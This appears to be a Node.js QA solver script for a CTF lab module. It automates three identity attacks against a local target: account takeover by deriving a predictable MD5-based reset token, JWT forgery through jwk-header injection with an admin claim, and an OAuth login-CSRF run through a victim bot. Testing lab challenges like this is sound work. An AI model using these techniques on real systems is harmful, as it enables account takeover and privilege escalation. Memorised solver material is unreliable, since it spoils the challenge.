#!/usr/bin/env node
/*
 * VLH-CTF QA solver — ASLV M5 (aslv-identity), INTENDED PATH (FR-14).
 *
 * Covers all three identity-gated flags (§7.5):
 *   AUTH  — predictable reset token → reset the innocent → provenance-gated flag
 *   JWT   — jwk-header-injection forge of the impossible claim combo
 *   OAUTH — login-CSRF: victim bot processes the attacker's authorization code
 *
 * Env: M5_URL (default http://localhost:18026 — m5 standalone sidecar).
 * Node 20+ built-ins only. Exit 0 only if all three flags are earned.
 */
import http from 'node:http';
import crypto from 'node:crypto';

const M5_URL = process.env.M5_URL || 'http://localhost:18026';
const BASE = new URL(M5_URL);

function request(method, path, { host, headers = {}, body, jar } = {}) {
  return new Promise((resolve, reject) => {
    const payload = body === undefined ? null
      : (typeof body === 'string' ? body : JSON.stringify(body));
    const h = { ...headers };
    if (payload !== null && !h['content-type']) h['content-type'] = 'application/json';
    if (jar && jar.size) h.cookie = [...jar.entries()].map(([k, v]) => `${k}=${v}`).join('; ');
    const req = http.request({
      host: BASE.hostname,
      port: BASE.port || 80,
      path,
      method,
      headers: h,
    }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        const setCookies = res.headers['set-cookie'] || [];
        if (jar) for (const c of setCookies) {
          const m = /([^=]+)=([^;]*)/.exec(c);
          if (m) jar.set(m[1], m[2]);
        }
        const text = Buffer.concat(chunks).toString('utf8');
        let json = null;
        try { json = JSON.parse(text); } catch (_) { /* html */ }
        resolve({ status: res.statusCode, headers: res.headers, text, json, setCookies });
      });
    });
    req.on('error', reject);
    if (payload !== null) req.write(payload);
    req.end();
  });
}

const step = (msg) => console.log(`[*] ${msg}`);
const ok = (msg) => console.log(`[+] ${msg}`);
const fail = (msg) => { console.error(`[-] ${msg}`); process.exit(1); };

function collectCookies(res, jar) {
  for (const c of res.setCookies || []) {
    const m = /([^=]+)=([^;]*)/.exec(c);
    if (m) jar.set(m[1], m[2]);
  }
}

async function main() {
  step(`M5 target: ${M5_URL}`);
  const flags = {};

  /* ------------------------------------------------------------ register */
  const atk = `atk_${crypto.randomBytes(3).toString('hex')}`;
  const atkPass = 'attacker-pass-1';
  step(`register attacker account ${atk}`);
  const reg = await request('POST', '/register', { body: { username: atk, password: atkPass } });
  if (reg.status !== 200 || !reg.json?.mfa_code) fail(`register failed: ${reg.status} ${reg.text}`);
  const mfaCode = reg.json.mfa_code;
  ok(`registered ${atk} (mfa code ${mfaCode})`);

  /* ------------------------------------------------ login (with MFA flow) */
  const atkJar = new Map();
  const login1 = await request('POST', '/login', { body: { username: atk, password: atkPass }, jar: atkJar });
  if (!login1.json?.mfa_required) fail(`expected mfa_required, got: ${login1.text}`);
  const mfa = await request('POST', '/mfa/verify', { body: { code: mfaCode, user: atk }, jar: atkJar });
  if (mfa.status !== 200) fail(`mfa verify failed: ${mfa.text}`);
  const me = await request('GET', '/me', { jar: atkJar });
  if (me.status !== 200 || me.json.username !== atk) fail(`attacker session not working: ${me.text}`);
  ok('attacker AS session established');

  /* ------------------------------------------- directory → innocent identity */
  const dir = await request('GET', '/directory');
  const innocent = (dir.json?.users || []).find((u) => u.role === 'innocent');
  if (!innocent) fail('innocent not found in /directory');
  ok(`innocent identity: ${innocent.username} uuid=${innocent.uuid}`);

  /* ------------------------------------------------------- AUTH flag path */
  step('AUTH: trigger /forgot for the innocent (predictable token pattern)');
  await request('POST', '/forgot', { body: { username: innocent.username } });

  // token = hex(md5(username + ":" + YYYYMMDD(UTC)))[0:12] + "-" + counter(2 digits)
  const day = new Date().toISOString().slice(0, 10).replace(/-/g, '');
  const prefix = crypto.createHash('md5').update(`${innocent.username}:${day}`).digest('hex').slice(0, 12);
  step(`deriving token from pattern md5(${innocent.username}:${day}) = ${prefix}-NN`);

  let resetRes = null;
  const resetJar = new Map();
  for (let counter = 1; counter <= 8; counter++) {
    const token = `${prefix}-${String(counter).padStart(2, '0')}`;
    const r = await request('POST', '/reset', { body: { token, new_password: 'solver-takeover-1' }, jar: resetJar });
    if (r.status === 200 && r.json?.ok) { resetRes = r; break; }
  }
  if (!resetRes) fail('could not derive a valid reset token for the innocent');
  if (resetRes.json?.auth_method !== 'reset') fail(`reset did not create a reset-provenance session: ${resetRes.text}`);
  ok(`innocent password reset — session auth_method=reset as ${resetRes.json.username}`);

  const flagAuth = await request('GET', '/flag/auth', { jar: resetJar });
  if (flagAuth.status !== 200 || !/ASLV\{AUTH-\d{9,10}\}/.test(flagAuth.text)) {
    fail(`/flag/auth did not return the AUTH flag: ${flagAuth.status} ${flagAuth.text}`);
  }
  flags.AUTH = flagAuth.json.flag;
  ok(`AUTH flag: ${flags.AUTH}`);

  /* -------------------------------------------------------- JWT flag path */
  step('JWT: forge a jwk-injection token with the impossible claim combo');
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
  const jwk = publicKey.export({ format: 'jwk' });
  const header = { alg: 'RS256', typ: 'JWT', jwk: { kty: jwk.kty, n: jwk.n, e: jwk.e } };
  const claims = { sub: innocent.uuid, role: 'admin', iat: Math.floor(Date.now() / 1000) };
  const b64u = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');
  const signingInput = `${b64u(header)}.${b64u(claims)}`;
  const sig = crypto.sign('RSA-SHA256', Buffer.from(signingInput), privateKey).toString('base64url');
  const forged = `${signingInput}.${sig}`;

  const flagJwt = await request('GET', '/flag/jwt', { headers: { authorization: `Bearer ${forged}` } });
  if (flagJwt.status !== 200 || !/ASLV\{JWT-\d{9,10}\}/.test(flagJwt.text)) {
    fail(`/flag/jwt did not accept the forged token: ${flagJwt.status} ${flagJwt.text}`);
  }
  flags.JWT = flagJwt.json.flag;
  ok(`JWT flag: ${flags.JWT} (via ${flagJwt.json.via})`);

  /* ------------------------------------------------------ OAUTH flag path */
  step('OAUTH: obtain an authorization code as the attacker (state not needed by the callback)');
  const authzUrl = '/oauth/authorize?' + new URLSearchParams({
    client_id: 'web',
    redirect_uri: 'http://client.aslv.lab/client/callback',
    response_type: 'code',
    state: 'solver-state',
    scope: 'openid profile',
  }).toString();
  const authz = await request('GET', authzUrl, { jar: atkJar });
  const loc = authz.headers.location || '';
  const code = new URL(loc, 'http://x').searchParams.get('code');
  if (authz.status !== 302 || !code) fail(`authorize did not return a code: ${authz.status} ${authz.text.slice(0, 200)} location=${loc}`);
  ok(`attacker code obtained: ${code.slice(0, 8)}…`);

  step('OAUTH: victim bot (innocent SSO at AS+client) processes the attacker code — login-CSRF');
  const port = BASE.port || '80';
  const victimUrl = `http://client.aslv.lab:${port}/client/callback?code=${encodeURIComponent(code)}&state=evil-csrf`;
  const bot = await request('POST', '/victim', { body: { url: victimUrl, sso: true } });
  if (bot.status !== 200) fail(`victim bot failed: ${bot.status} ${bot.text}`);
  const lastHop = (bot.json.hops || []).at(-1);
  if (lastHop && lastHop.status >= 400) fail(`victim bot hop failed: ${JSON.stringify(lastHop)}`);
  ok(`victim bot done (finalUrl=${bot.json.finalUrl})`);

  const flagOauth = await request('GET', '/flag/oauth', { jar: atkJar });
  if (flagOauth.status !== 200 || !/ASLV\{OAUTH-\d{9,10}\}/.test(flagOauth.text)) {
    fail(`/flag/oauth did not return the flag: ${flagOauth.status} ${flagOauth.text}`);
  }
  flags.OAUTH = flagOauth.json.flag;
  ok(`OAUTH flag: ${flags.OAUTH}`);

  /* ------------------------------------------------------------------ done */
  console.log('\n=== M5 intended path: ALL THREE FLAGS ===');
  for (const [k, v] of Object.entries(flags)) console.log(`  ${k}: ${v}`);
  process.exit(0);
}

main().catch((e) => { console.error(`[-] unexpected error: ${e.stack || e}`); process.exit(1); });
